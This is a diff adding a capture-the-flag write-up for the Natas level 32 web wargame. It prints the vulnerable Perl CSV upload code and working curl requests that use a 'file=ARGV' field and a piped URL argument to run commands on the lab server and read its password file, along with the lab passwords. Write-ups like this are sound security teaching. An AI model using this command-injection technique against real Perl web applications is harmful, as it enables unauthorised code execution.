@@ -3884,6 +3884,146 @@ Don't let user input control file **input sources**, as it can lead to informati
 - **Date**: 2026-04-30 (solved, not documented)
 - **URL**: `http://natas32.natas.labs.overthewire.org`
 - **Password**: `NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`
+- **Tools**: Web Browser, `curl`, `Perl`, `CSV`
+
+#### The Solution
+
+Use CTRL + U to view the page source. And notice:
+
+```html
+<h1>natas32</h1>
+<div id="content">
+
+<form action="index.pl" method="post" enctype="multipart/form-data">
+    <h2> CSV2HTML</h2>
+    <br>
+    We all like .csv files.<br>
+    But isn't a nicely rendered and sortable table much cooler?<br>
+    <br>
+    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
+    <br><br>
+    Select file to upload:
+    <span class="btn btn-default btn-file">
+        Browse <input type="file" name="file">
+    </span>
+    <input type="submit" value="Upload" name="submit" class="btn">
+</form>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+```
+
+Let's view the source code!
+```perl
+END
+
+my $cgi = CGI->new;
+if ($cgi->upload('file')) {
+    my $file = $cgi->param('file');
+    print '<table class="sortable table table-hover table-striped">';
+    $i=0;
+    while (<$file>) {
+        my @elements=split /,/, $_;
+
+        if($i==0){ # header
+            print "<tr>";
+            foreach(@elements){
+                print "<th>".$cgi->escapeHTML($_)."</th>";
+            }
+            print "</tr>";
+        }
+        else{ # table content
+            print "<tr>";
+            foreach(@elements){
+                print "<td>".$cgi->escapeHTML($_)."</td>";
+            }
+            print "</tr>";
+        }
+        $i+=1;
+    }
+    print '</table>';
+}
+else{
+print <<END;
+```
+
+Notice the hint `This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.` in the `HTML`!
+
+First, let's try what we did in level 31 and see what happens.
+
+```powershell
+echo "1,2,`n3,4," > test.csv
+curl.exe `
+  -u "natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B" `
+  -X POST `
+  -F "file=ARGV" `
+  -F "file=@test.csv" `
+  "http://natas32.natas.labs.overthewire.org/?/etc/natas_webpass/natas33"
+```
+
+But this time, it does not work.
+
+Remember level 29, where we passed commands via the file parameter?
+
+Maybe we can do something similar here?
+
+After all, `file=ARGV` makes `Perl` process the supplied URL arguments as file input sources.
+
+So let's try to list some files:
+```powershell
+curl.exe `
+  -u "natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B" `
+  -X POST `
+  -F "file=ARGV" `
+  -F "file=@test.csv" `
+  "http://natas32.natas.labs.overthewire.org/?ls%20.%20|"
+```
+
+The trailing `|` causes `Perl` to treat the argument as a command instead of a normal filename.
+
+Output:
+```html
+<h1>natas32</h1>
+<div id="content">
+<table class="sortable table table-hover table-striped"><tr><th>.:
+</th></tr><tr><td>bootstrap-3.3.6-dist
+</td></tr><tr><td>getpassword
+</td></tr><tr><td>index-source.html
+</td></tr><tr><td>index.pl
+</td></tr><tr><td>jquery-1.12.3.min.js
+</td></tr><tr><td>sorttable.js
+</td></tr><tr><td>tmp
+</td></tr></table>
+```
+
+Notice the `getpassword` file here!
+
+Maybe we can execute it directly?
+```powershell
+curl.exe `
+  -u "natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B" `
+  -X POST `
+  -F "file=ARGV" `
+  -F "file=@test.csv" `
+  "http://natas32.natas.labs.overthewire.org/?./getpassword%20|"
+```
+
+Output:
+```html
+<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
+</th></tr></table>
+```
+
+And the password for natas33 is `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`.
+
+#### The Lesson
+
+Don't let **user input control file input sources**, as it can lead to unintended file access or code execution.
+
+### Level 33
+
+- **Date**: 2026-04-30 (solved, not documented)
+- **URL**: `http://natas33.natas.labs.overthewire.org`
+- **Password**: `2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ`
 - **Tools**: Web Browser
 
 #### The Solution
